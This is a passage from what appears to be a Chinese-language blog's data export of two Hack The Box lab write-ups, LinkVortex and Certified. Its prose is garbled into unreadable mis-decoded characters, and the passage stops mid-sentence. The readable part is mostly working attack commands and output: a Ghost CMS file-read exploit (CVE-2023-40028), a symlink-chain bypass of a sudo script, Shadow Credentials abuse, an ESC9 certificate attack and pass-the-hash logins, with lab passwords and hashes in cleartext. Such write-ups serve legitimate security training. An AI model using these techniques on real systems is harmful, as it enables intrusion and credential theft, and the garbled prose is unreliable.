æˆåŠŸè¯»å–åˆ°/etc/passwd\nåœ¨GitHackä¸­è¿˜å‘ç°äº†ä¸€ä¸ªDockerfile\n[root@kali] /home/kali/LinkVortex/GitHack/dev.linkvortex.htb (master) âš¡ â¯ cat Dockerfile.ghost FROM ghost:5.58.0\r# Copy the config\rCOPY config.production.json /var/lib/ghost/config.production.json\r# Prevent installing packages\rRUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb\r# Wait for the db to be ready first\rCOPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh\rCOPY entry.sh /entry.sh\rRUN chmod +x /var/lib/ghost/wait-for-it.sh\rRUN chmod +x /entry.sh\rENTRYPOINT [\u0026#34;/entry.sh\u0026#34;]\rCMD [\u0026#34;node\u0026#34;, \u0026#34;current/index.js\u0026#34;] å°è¯•è¯»å–è¿™ä¸ª/var/lib/ghost/config.production.jsoné…ç½®æ–‡ä»¶\n[root@kali] /home/kali/LinkVortex/CVE-2023-40028 (master) âš¡ â¯ ./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45\rWELCOME TO THE CVE-2023-40028 SHELL\rfile\u0026gt; /var/lib/ghost/config.production.json\r{\r\u0026#34;url\u0026#34;: \u0026#34;http://localhost:2368\u0026#34;,\r\u0026#34;server\u0026#34;: {\r\u0026#34;port\u0026#34;: 2368,\r\u0026#34;host\u0026#34;: \u0026#34;::\u0026#34;\r},\r\u0026#34;mail\u0026#34;: {\r\u0026#34;transport\u0026#34;: \u0026#34;Direct\u0026#34;\r},\r\u0026#34;logging\u0026#34;: {\r\u0026#34;transports\u0026#34;: [\u0026#34;stdout\u0026#34;]\r},\r\u0026#34;process\u0026#34;: \u0026#34;systemd\u0026#34;,\r\u0026#34;paths\u0026#34;: {\r\u0026#34;contentPath\u0026#34;: \u0026#34;/var/lib/ghost/content\u0026#34;\r},\r\u0026#34;spam\u0026#34;: {\r\u0026#34;user_login\u0026#34;: {\r\u0026#34;minWait\u0026#34;: 1,\r\u0026#34;maxWait\u0026#34;: 604800000,\r\u0026#34;freeRetries\u0026#34;: 5000\r}\r},\r\u0026#34;mail\u0026#34;: {\r\u0026#34;transport\u0026#34;: \u0026#34;SMTP\u0026#34;,\r\u0026#34;options\u0026#34;: {\r\u0026#34;service\u0026#34;: \u0026#34;Google\u0026#34;,\r\u0026#34;host\u0026#34;: \u0026#34;linkvortex.htb\u0026#34;,\r\u0026#34;port\u0026#34;: 587,\r\u0026#34;auth\u0026#34;: {\r\u0026#34;user\u0026#34;: \u0026#34;bob@linkvortex.htb\u0026#34;,\r\u0026#34;pass\u0026#34;: \u0026#34;fibber-talented-worth\u0026#34;\r}\r}\r}\r} å¾—åˆ°ç”¨æˆ·åå’Œå¯†ç \nusername:bob@linkvortex.htb\rpassword:fibber-talented-worth sshç™»å½•åæ‹¿åˆ°user.txt\nRoot #\ræ£€æŸ¥Bobçš„å‘½ä»¤æƒé™\nbob@linkvortex:~$ sudo -l\rMatching Defaults entries for bob on linkvortex:\renv_reset, mail_badpass,\rsecure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty,\renv_keep+=CHECK_CONTENT\rUser bob may run the following commands on linkvortex:\r(ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png æŸ¥çœ‹è¿™ä¸ª/opt/ghost/clean_symlink.sh\nbob@linkvortex:~$ cat /opt/ghost/clean_symlink.sh #!/bin/bash\rQUAR_DIR=\u0026#34;/var/quarantined\u0026#34;\rif [ -z $CHECK_CONTENT ];then\rCHECK_CONTENT=false\rfi\rLINK=$1\rif ! [[ \u0026#34;$LINK\u0026#34; =~ \\.png$ ]]; then\r/usr/bin/echo \u0026#34;! First argument must be a png file !\u0026#34;\rexit 2\rfi\rif /usr/bin/sudo /usr/bin/test -L $LINK;then\rLINK_NAME=$(/usr/bin/basename $LINK)\rLINK_TARGET=$(/usr/bin/readlink $LINK)\rif /usr/bin/echo \u0026#34;$LINK_TARGET\u0026#34; | /usr/bin/grep -Eq \u0026#39;(etc|root)\u0026#39;;then\r/usr/bin/echo \u0026#34;! Trying to read critical files, removing link [ $LINK ] !\u0026#34;\r/usr/bin/unlink $LINK\relse\r/usr/bin/echo \u0026#34;Link found [ $LINK ] , moving it to quarantine\u0026#34;\r/usr/bin/mv $LINK $QUAR_DIR/\rif $CHECK_CONTENT;then\r/usr/bin/echo \u0026#34;Content:\u0026#34;\r/usr/bin/cat $QUAR_DIR/$LINK_NAME 2\u0026gt;/dev/null\rfi\rfi\rfi å¦‚æœæ–‡ä»¶ååç¼€æ˜¯ .pngï¼Œå¹¶ä¸”æ–‡ä»¶æ˜¯ç¬¦å·é“¾æ¥ï¼Œä¸”ç›®æ ‡è·¯å¾„ ä¸åŒ…å« etc æˆ– rootï¼ˆå³ç›®æ ‡ä¸æ˜¯æ•æ„Ÿæ–‡ä»¶ï¼‰ï¼Œè„šæœ¬ä¼šï¼š\nå°†ç¬¦å·é“¾æ¥ ç§»åŠ¨åˆ° /var/quarantined ç›®å½•ã€‚\nå¦‚æœ CHECK_CONTENT=trueï¼Œè„šæœ¬ä¼šå°è¯•è¾“å‡ºè¯¥æ–‡ä»¶çš„å†…å®¹ã€‚\nç„¶ååˆ›å»ºç¬¦å·é“¾æ¥ï¼Œè¿æ¥åˆ°root.txtä¸‹ï¼Œç”±äºè„šæœ¬ä¼šæ£€æŸ¥å‚æ•°ï¼Œå¯ä»¥ä½¿ç”¨äºŒæ¬¡é“¾æ¥æ¥è¿›è¡Œç»•è¿‡ï¼ŒåŒæ—¶å°†CHECK_CONTENTè®¾ç½®ä¸ºtrue\nbob@linkvortex:~$ ln -s /root/root.txt hyh.txt\rbob@linkvortex:~$ ln -s /home/bob/hyh.txt hyh.png\rbob@linkvortex:~$ sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/hyh.png Summary #\rè·å–Userçš„è¿‡ç¨‹æ˜¯æ­£å¸¸çš„ä¸€äº›ä¿¡æ¯æ”¶é›†ã€ç«¯å£ä»¥åŠå­åŸŸåæ‰«æç­‰ã€‚å¾ˆæ˜æ˜¾æ˜¯devå¼€å‘ç¯å¢ƒå­˜åœ¨Githackæ³„éœ²ï¼Œå¼€å‘äººå‘˜åœ¨éƒ¨ç½²ä¸Šå»çš„æ—¶å€™å¹¶æ²¡æœ‰å…³æ‰è¿™ä¸ªå¼€å‘ç¯å¢ƒã€‚GhostCMSçš„ç‰ˆæœ¬æ²¡æœ‰è¢«åŠæ—¶æ›´æ–°ï¼Œå­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–çš„CVEï¼Œå› æ­¤è·å–åˆ°äº†sshç”¨æˆ·çš„è´¦å·å¯†ç ã€‚\nè¿™ä¸ªmachineçš„Rootè·å–ä¼¼ä¹ä¸éœ€è¦åŠåˆ°ææƒï¼Œè€Œæ˜¯ä½¿ç”¨ç‰¹æ®Šæƒé™çš„è„šæœ¬å¯¹ä»»æ„æ–‡ä»¶è¿›è¡Œè¯»å–ã€‚å› ä¸ºclean_symlink.shåªæ˜¯å¯¹å‘½ä»¤è¡Œä¸­çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œè€Œç¬¦å·é“¾æ¥æ˜¯å¯ä»¥ä¸€ä¸ªæ¥ç€ä¸€ä¸ªå½¢æˆç¬¦å·é“¾æ¥é“¾æ¡ï¼Œä»è€Œç›´æ¥è¯»å–åˆ°root.txtã€‚ï¼ˆå®é™…ä¸Šä¹Ÿå¯ä»¥è¯»å–rootçš„sshå…¬é’¥æˆ–è€…æ˜¯å¯†ç hashï¼Œæ¥å°è¯•è¿›è¡Œsshç™»å½•ï¼Œè¿™ä¸ªæˆ‘å°±æ²¡æœ‰å»å°è¯•äº†ï¼Œå› ä¸ºé€šè¿‡è¿™ä¸ªè„šæœ¬å·²ç»å¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–ã€‚But You Can Try It ! ï¼‰\n","date":"2024-12-09","externalUrl":null,"permalink":"/posts/2024/12/htb-linkvortex/","section":"Posts","summary":"","title":"HTB-LinkVortex","type":"posts"},{"content":"\rBox Info #\rOS Windows Difficulty Medium As is common in Windows pentests, you will start the Certified box with credentials for the following account: Username: judith.mader Password: judith09\nNmap #\râ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Certified]\râ””â”€# nmap -sSCV -Pn -p- Certified.htb Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-06 20:00 CST\rStats: 0:02:15 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 90.13% done; ETC: 20:02 (0:00:15 remaining)\rStats: 0:03:16 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan\rService scan Timing: About 61.90% done; ETC: 20:04 (0:00:25 remaining)\rStats: 0:03:16 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan\rService scan Timing: About 61.90% done; ETC: 20:04 (0:00:25 remaining)\rNmap scan report for Certified.htb (10.10.11.41)\rHost is up (0.083s latency).\rNot shown: 65514 filtered tcp ports (no-response)\rPORT STATE SERVICE VERSION\r53/tcp open domain Simple DNS Plus\r88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-12-06 18:49:00Z)\r135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)\r| ssl-cert: Subject: commonName=DC01.certified.htb\r| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC01.certified.htb\r| Not valid before: 2024-05-13T15:49:36\r|_Not valid after: 2025-05-13T15:49:36\r|_ssl-date: 2024-12-06T18:50:32+00:00; +6h45m59s from scanner time.\r445/tcp open microsoft-ds?\r464/tcp open kpasswd5?\r593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)\r| ssl-cert: Subject: commonName=DC01.certified.htb\r| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC01.certified.htb\r| Not valid before: 2024-05-13T15:49:36\r|_Not valid after: 2025-05-13T15:49:36\r|_ssl-date: 2024-12-06T18:50:32+00:00; +6h45m59s from scanner time.\r3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)\r|_ssl-date: 2024-12-06T18:50:32+00:00; +6h45m59s from scanner time.\r| ssl-cert: Subject: commonName=DC01.certified.htb\r| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC01.certified.htb\r| Not valid before: 2024-05-13T15:49:36\r|_Not valid after: 2025-05-13T15:49:36\r3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)\r| ssl-cert: Subject: commonName=DC01.certified.htb\r| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC01.certified.htb\r| Not valid before: 2024-05-13T15:49:36\r|_Not valid after: 2025-05-13T15:49:36\r|_ssl-date: 2024-12-06T18:50:32+00:00; +6h45m59s from scanner time.\r5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\r|_http-server-header: Microsoft-HTTPAPI/2.0\r|_http-title: Not Found\r9389/tcp open mc-nmf .NET Message Framing\r49666/tcp open msrpc Microsoft Windows RPC\r49668/tcp open msrpc Microsoft Windows RPC\r49673/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r49674/tcp open msrpc Microsoft Windows RPC\r49683/tcp open msrpc Microsoft Windows RPC\r49715/tcp open msrpc Microsoft Windows RPC\r49737/tcp open msrpc Microsoft Windows RPC\r49772/tcp open msrpc Microsoft Windows RPC\rService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\rHost script results:\r| smb2-time: | date: 2024-12-06T18:49:56\r|_ start_date: N/A\r|_clock-skew: mean: 6h45m58s, deviation: 0s, median: 6h45m58s\r| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required\rService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 254.91 seconds GetAllUserName #\râ”Œâ”€â”€(rootã‰¿kali)-[~kali/Certified]\râ””â”€# crackmapexec smb certified.htb -u \u0026#34;judith.mader\u0026#34; -p \u0026#34;judith09\u0026#34; --rid-brute | grep SidTypeUser\rSMB Certified.htb 445 DC01 500: CERTIFIED\\Administrator (SidTypeUser)\rSMB Certified.htb 445 DC01 501: CERTIFIED\\Guest (SidTypeUser)\rSMB Certified.htb 445 DC01 502: CERTIFIED\\krbtgt (SidTypeUser)\rSMB Certified.htb 445 DC01 1000: CERTIFIED\\DC01$ (SidTypeUser)\rSMB Certified.htb 445 DC01 1103: CERTIFIED\\judith.mader (SidTypeUser)\rSMB Certified.htb 445 DC01 1105: CERTIFIED\\management_svc(SidTypeUser)\rSMB Certified.htb 445 DC01 1106: CERTIFIED\\ca_operator (SidTypeUser)\rSMB Certified.htb 445 DC01 1601: CERTIFIED\\alexander.huges (SidTypeUser)\rSMB Certified.htb 445 DC01 1602: CERTIFIED\\harry.wilson (SidTypeUser)\rSMB Certified.htb 445 DC01 1603: CERTIFIED\\gregory.cameron (SidTypeUser) Bloodhound #\râ”Œâ”€â”€(rootã‰¿kali)-[~kali/Certified]\râ””â”€# bloodhound-python -u judith.mader -p \u0026#39;judith09\u0026#39; -c All -d certified.htb -ns 10.10.11.41 INFO: Found AD domain: certified.htb\rINFO: Getting TGT for user\rWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)\rINFO: Connecting to LDAP server: dc01.certified.htb\rINFO: Found 1 domains\rINFO: Found 1 domains in the forest\rINFO: Found 1 computers\rINFO: Connecting to LDAP server: dc01.certified.htb\rINFO: Found 10 users\rINFO: Found 53 groups\rINFO: Found 2 gpos\rINFO: Found 1 ous\rINFO: Found 19 containers\rINFO: Found 0 trusts\rINFO: Starting computer enumeration with 10 workers\rINFO: Querying computer: DC01.certified.htb\rINFO: Done in 00M 17S å¯¼å…¥åˆ°bloodhoundGUIé‡Œé¢è¿›è¡Œåˆ†æ\nå‘ç°Judithç”¨æˆ·å¯ä»¥æ›´æ”¹ Management ç»„çš„æ‰€æœ‰è€…æˆ–ä¿®æ”¹è¯¥ç»„çš„è®¿é—®æ§åˆ¶åˆ—è¡¨ (ACL)\nManagementç»„å¯ä»¥å¯¹å…¶ä¸­çš„SVCè¿›è¡Œå†™å…¥\nSVCå¯ä»¥å®Œå…¨æ§åˆ¶CA_OPERATOR\nUser #\rä¿®æ”¹ Management ç»„çš„ ACLï¼Œæˆäºˆ judith.mader ç”¨æˆ· WriteMembers æƒé™ï¼Œä½¿å…¶èƒ½å¤Ÿç®¡ç†è¯¥ç»„çš„æˆå‘˜\nâ”Œâ”€â”€(rootã‰¿kali)-[~kali/Certified]\râ””â”€# impacket-dacledit -action \u0026#39;write\u0026#39; -rights \u0026#39;WriteMembers\u0026#39; -target-dn \u0026#34;CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB\u0026#34; -principal \u0026#34;judith.mader\u0026#34; \u0026#34;certified.htb/judith.mader:judith09\u0026#34;\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] DACL backed up to dacledit-20241206-205722.bak\r[*] DACL modified successfully!\ræŠŠJudithè‡ªå·±åŠ å…¥åˆ°Managementç»„é‡Œé¢\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Certified]\râ””â”€# bloodyAD --host 10.10.11.41 -d \u0026#39;certified.htb\u0026#39; -u \u0026#39;judith.mader\u0026#39; -p \u0026#39;judith09\u0026#39; add groupMember \u0026#34;Management\u0026#34; \u0026#34;judith.mader\u0026#34;\r[+] judith.mader added to Management åŸŸæŒä¹…æ€§ï¼šShadow Credentials - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·\nKillingTree/pywhisker: Python version of the C# tool for \u0026ldquo;Shadow Credentials\u0026rdquo; attacks (github.com)\nè¿™ä¸ªå·¥å…·å¦‚æœå‡ºç°argsçš„æŠ¥é”™ï¼Œè¦åˆ°main()å‡½æ•°ä¸­æ·»åŠ globals argsï¼Œåœ¨argsçš„parseè°ƒç”¨ä¹‹å‰\nä½¿ç”¨ pywhisker.py å·¥å…·è¿›è¡Œ Kerberos è®¤è¯ç»•è¿‡æ“ä½œï¼Œå¹¶ä¸”é€šè¿‡ä¿®æ”¹ç›®æ ‡å¯¹è±¡çš„ msDS-KeyCredentialLink å±æ€§æ¥ç”Ÿæˆå¹¶å­˜å‚¨ä¸ç›®æ ‡ç›¸å…³çš„è¯ä¹¦å’Œå¯†é’¥\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Certified/pywhisker/pywhisker]\râ””â”€# python pywhisker.py -d \u0026#34;certified.htb\u0026#34; -u \u0026#34;judith.mader\u0026#34; -p judith09 --target management_svc --action add\r[*] Searching for the target account\r[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb\r[*] Generating certificate\r[*] Certificate generated\r[*] Generating KeyCredential\r[*] KeyCredential generated with DeviceID: 7ba66598-d473-200b-e335-73693201fe6a\r[*] Updating the msDS-KeyCredentialLink attribute of management_svc\r[+] Updated the msDS-KeyCredentialLink attribute of the target object\r[+] Saved PFX (#PKCS12) certificate \u0026amp; key at path: oigNgAOY.pfx\r[*] Must be used with password: F7ddKVbzqkaPtLgqVxFX\r[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools\rç„¶åè¯·æ±‚è·å–management_svcçš„TGTç¥¨æ®ï¼Œå¦‚æœæŠ¥é”™éœ€è¦ä½¿ç”¨ntpdateåŒæ­¥æ—¶åŒº\nä½¿ç”¨ PKINITtools ä¸­çš„ gettgtpkinit.py è„šæœ¬æ¥è¯·æ±‚ä¸€ä¸ª Kerberos TGTï¼ˆTicket Granting Ticketï¼‰ï¼Œå¹¶ä¸”ä½¿ç”¨äº†ä¹‹å‰ç”Ÿæˆçš„è¯ä¹¦å’Œå¯†é’¥\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Certified/PKINITtools]\râ””â”€# python gettgtpkinit.py -cert-pfx ../pywhisker/pywhisker/oigNgAOY.pfx -pfx-pass F7ddKVbzqkaPtLgqVxFX certified.htb/management_svc hhh.ccache\r2024-12-08 18:59:06,443 minikerberos INFO Loading certificate and key from file\rINFO:minikerberos:Loading certificate and key from file\r2024-12-08 18:59:06,456 minikerberos INFO Requesting TGT\rINFO:minikerberos:Requesting TGT\r2024-12-08 18:59:28,228 minikerberos INFO AS-REP encryption key (you might need this later):\rINFO:minikerberos:AS-REP encryption key (you might need this later):\r2024-12-08 18:59:28,228 minikerberos INFO 07229e48b98f6800f3c17aaef3a49815c7b1fff0881969a3756856366a8a87f6\rINFO:minikerberos:07229e48b98f6800f3c17aaef3a49815c7b1fff0881969a3756856366a8a87f6\r2024-12-08 18:59:28,230 minikerberos INFO Saved TGT to file\rINFO:minikerberos:Saved TGT to file è®¾ç½®ç¯å¢ƒå˜é‡\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Certified/PKINITtools]\râ””â”€# export KRB5CCNAME=/home/kali/Certified/PKINITtools/hhh.ccache\rä½¿ç”¨ PKINITtools ä¸­çš„ getnthash.py è„šæœ¬ï¼Œé€šè¿‡å·²ç»è·å¾—çš„ TGT æ¥è¯·æ±‚å¹¶æ¢å¤ management_svc è´¦æˆ·çš„ NT hash\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Certified/PKINITtools]\râ””â”€# python getnthash.py -key 07229e48b98f6800f3c17aaef3a49815c7b1fff0881969a3756856366a8a87f6 certified.htb/management_svc\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Using TGT from cache\r/home/kali/Certified/PKINITtools/getnthash.py:144: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\rnow = datetime.datetime.utcnow()\r/home/kali/Certified/PKINITtools/getnthash.py:192: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\rnow = datetime.datetime.utcnow() + datetime.timedelta(days=1)\r[*] Requesting ticket to self with PAC\rRecovered NT Hash\ra091c1832bcdd4677c28b5a6a1295584 æœ‰äº†NThashå°±å¯ä»¥ä½¿ç”¨Evil-winrmè¿œç¨‹ç™»å½•\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Certified/PKINITtools]\râ””â”€# evil-winrm -i certified.htb -u management_svc -H \u0026#34;a091c1832bcdd4677c28b5a6a1295584\u0026#34;\rEvil-WinRM shell v3.7\rWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\rInfo: Establishing connection to remote endpoint\r*Evil-WinRM* PS C:\\Users\\management_svc\\Documents\u0026gt; cd ../desktop\r*Evil-WinRM* PS C:\\Users\\management_svc\\desktop\u0026gt; cat user.txt Root #\rmanagement_svcå¯ä»¥å®Œå…¨æ§åˆ¶ca_operator\nå°è¯•ä¿®æ”¹caçš„å¯†ç \nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Certified/PKINITtools]\râ””â”€# pth-net rpc password \u0026#34;ca_operator\u0026#34; \u0026#34;12345678\u0026#34; -U \u0026#34;certified.htb\u0026#34;/\u0026#34;management_svc\u0026#34;%\u0026#34;a091c1832bcdd4677c28b5a6a1295584\u0026#34;:\u0026#34;a091c1832bcdd4677c28b5a6a1295584\u0026#34; -S \u0026#34;DC01.certified.htb\u0026#34;\rE_md4hash wrapper called.\rHASH PASS: Substituting user supplied NTLM HASH... æ£€æŸ¥æ˜¯å¦ä¿®æ”¹æˆåŠŸ\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Certified/PKINITtools]\râ””â”€# nxc smb 10.10.11.41 -u ca_operator -p 12345678 SMB 10.10.11.41 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False) SMB 10.10.11.41 445 DC01 No Security Extension - ESC9 #\rAD CS Domain Escalation | HackTricks æ˜¯ä½¿ç”¨ Certipy å·¥å…·æŸ¥æ‰¾å’Œè·å–ä¸ judith.mader@certified.htb ç”¨æˆ·ç›¸å…³çš„è¯ä¹¦ä¿¡æ¯ï¼Œå¹¶è·å– certified-DC01-CA è¯ä¹¦é¢å‘æœºæ„ (CA) çš„é…ç½®\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Certified]\râ””â”€# certipy-ad find -u judith.mader@certified.htb -p judith09 -dc-ip 10.10.11.41\rCertipy v4.8.2 - by Oliver Lyak (ly4k)\r[*] Finding certificate templates\r[*] Found 34 certificate templates\r[*] Finding certificate authorities\r[*] Found 1 certificate authority\r[*] Found 12 enabled certificate templates\r[*] Trying to get CA configuration for \u0026#39;certified-DC01-CA\u0026#39; via CSRA\r[!] Got error while trying to get CA configuration for \u0026#39;certified-DC01-CA\u0026#39; via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.\r[*] Trying to get CA configuration for \u0026#39;certified-DC01-CA\u0026#39; via RRP\r[!] Failed to connect to remote registry. Service should be starting now. Trying again...\r[*] Got CA configuration for \u0026#39;certified-DC01-CA\u0026#39;\r[*] Saved BloodHound data to \u0026#39;20241208202644_Certipy.zip\u0026#39;. Drag and drop the file into the BloodHound GUI from @ly4k\r[*] Saved text output to \u0026#39;20241208202644_Certipy.txt\u0026#39;\r[*] Saved JSON output to \u0026#39;20241208202644_Certipy.json\u0026#39; å‘ç°å­˜åœ¨NoSecurityExtensionï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨ESC9æ¥è¿›è¡Œæ”»å‡»\nä½¿ç”¨ Certipy å·¥å…·å°† NT hash (a091c1832bcdd4677c28b5a6a1295584) æ›´æ–°åˆ° ca_operator è´¦æˆ·ï¼Œå¹¶ä¿®æ”¹äº†è¯¥è´¦æˆ·çš„ userPrincipalName (UPN) ä¸º Administrator\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Certified]\râ””â”€# certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator\rCertipy v4.8.2 - by Oliver Lyak (ly4k)\r[*] Updating user \u0026#39;ca_operator\u0026#39;:\ruserPrincipalName : Administrator\r[*] Successfully updated \u0026#39;ca_operator\u0026#39; æˆåŠŸè¯·æ±‚åˆ°ä¸€ä¸ªè¯ä¹¦ï¼Œä¸”è¯¥è¯ä¹¦ä¸ Administrator è´¦æˆ·å…³è”ï¼ˆå°½ç®¡è¯·æ±‚çš„æ˜¯ ca_operator ç”¨æˆ·ï¼‰ã€‚è¿™æ„å‘³ç€ï¼Œç°åœ¨æœ‰äº†ä¸€ä¸ªå¯ä»¥ä»£è¡¨ Administrator è´¦æˆ·çš„è¯ä¹¦ã€‚\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Certified]\râ””â”€# certipy-ad req -username ca_operator@certified.htb -p 12345678 -ca certified-DC01-CA -template CertifiedAuthentication -debug Certipy v4.8.2 - by Oliver Lyak (ly4k)\r[+] Trying to resolve \u0026#39;CERTIFIED.HTB\u0026#39; at \u0026#39;192.168.237.2\u0026#39;\r[+] Resolved \u0026#39;CERTIFIED.HTB\u0026#39; from cache: 10.10.11.41\r[+] Generating RSA key\r[*] Requesting certificate via RPC\r[+] Trying to connect to endpoint: ncacn_np:10.10.11.41[\\pipe\\cert]\r[+] Connected to endpoint: ncacn_np:10.10.11.41[\\pipe\\cert]\r[*] Successfully requested certificate\r[*] Request ID is 4\r[*] Got certificate with UPN \u0026#39;Administrator\u0026#39;\r[*] Certificate has no object SID\r[*] Saved certificate and private key to \u0026#39;administrator.pfx\u0026#39; ä½¿ç”¨ Certipy å·¥å…·ï¼Œé€šè¿‡ administrator.pfx è¯ä¹¦æ–‡ä»¶ä»¥ administrator@certified.htb ç”¨æˆ·èº«ä»½è¿›è¡Œ Kerberos è®¤è¯ï¼Œå¹¶æˆåŠŸè·å– TGT å’Œ NT hash\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Certified]\râ””â”€# certipy-ad auth -pfx administrator.pfx -domain certified.htb\rCertipy v4.8.2 - by Oliver Lyak (ly4k)\r[*] Using principal: administrator@certified.htb\r[*] Trying to get TGT...\r[*] Got TGT\r[*] Saved credential cache to \u0026#39;administrator.ccache\u0026#39;\r[*] Trying to retrieve NT hash for \u0026#39;administrator\u0026#39;\r[*] Got hash for \u0026#39;administrator@certified.htb\u0026#39;: aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34\ræœ€åé€šè¿‡evil-winrmç™»å½•è·å–åˆ°root.txt\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Certified]\râ””â”€# evil-winrm -i certified.htb -u administrator -H \u0026#34;0d5b49608bbce1751f708748f67e2d34\u0026#34; Evil-WinRM shell v3.7\rWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\rInfo: Establishing connection to remote endpoint\r*Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; cd ../desktop\r*Evil-WinRM* PS C:\\Users\\Administrator\\desktop\u0026gt; cat root.txt Summary #\rè¿™ä¸ªmachineæ˜¯ä¸»è¦å…³äºADåŸŸå†…è¯ä¹¦çš„\nUSERï¼šjudithå…·æœ‰WriteOwneræƒé™å¯ä»¥å°†è‡ªå·±å†™å…¥è¿™ä¸ªç»„ï¼Œç”±äºManagementç»„å¯¹svcçš„æƒé™å¯ä»¥å†™å…¥ï¼Œå› æ­¤ä¿®æ”¹äº†ä»–çš„ msDS-KeyCredentialLink å±æ€§ï¼Œç„¶åè·å–svcçš„TGTï¼Œæœ€ç»ˆæ¢å¤ä»–çš„NThash\nROOTï¼šé¦–å…ˆæ£€æŸ¥äº†judithçš„è¯ä¹¦é…ç½®ï¼Œå‘ç°å­˜åœ¨ESC9ï¼Œç”±äºmanagement_svcå¯¹ca_operatorå…·æœ‰GenericAllæƒé™ï¼Œå› æ­¤å¯ä»¥ä¿®æ”¹å…¶å¯†ç ï¼Œä»¥åŠuserPrincipalNameä¿®æ”¹ä¸ºadministratorã€‚(æŸç§ç¨‹åº¦ä¸Šï¼Œsvc è´¦æˆ·å¦‚æœåœ¨è¯ä¹¦é¢å‘æœºæ„ï¼ˆCAï¼‰ä¸Šæ‹¥æœ‰ GenericAll 